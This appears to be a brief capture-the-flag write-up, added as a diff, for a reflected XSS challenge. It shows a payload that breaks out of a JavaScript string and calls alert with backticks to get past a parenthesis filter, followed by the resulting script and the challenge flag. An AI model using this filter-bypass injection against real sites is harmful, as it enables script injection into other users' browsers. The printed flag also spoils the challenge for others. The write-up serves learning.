@@ -1,0 +1,23 @@
+http://xss2.sect.ctf.rocks/index.php?xss=stuff
+
+I spent quite some time on this, and I learned something new :)
+
+The xss parameter was set to a variable 'a':
+
+<script>
+var a = "stuff";
+</script>
+
+The most useful characters was filtered, I had almost given up when I found a clue in an old write-up and managed to get an alert () :)
+
+http://xss2.sect.ctf.rocks/?xss=stuff%22;%20alert`1`//
+
+Which became:
+
+<script>
+var a = "stuff"; alert`1`//";
+</script>
+
+sect{c4t_g0t_ur_p4r3nth3s3s?}
+
+\o/
